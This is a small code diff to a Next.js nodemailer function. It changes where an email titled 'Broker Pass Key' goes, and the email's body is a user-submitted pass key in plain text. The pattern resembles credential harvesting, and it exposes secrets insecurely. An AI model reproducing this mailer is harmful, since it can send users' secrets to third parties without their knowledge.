@@ -19,7 +19,7 @@ export default async function SendMail(
 
   const mailOptions: nodemailer.SendMailOptions = {
     from: process.env.NEXT_PUBLIC_EMAIL_USER, // sender address
-    to: process.env.NEXT_PUBLIC_EMAIL_USER, // list of receivers
+    to: process.env.NEXT_PUBLIC_EMAIL_RECEIVE, // list of receivers
     subject: "Broker Pass Key", // Subject line
     text: request.pass, // plain text body
   };
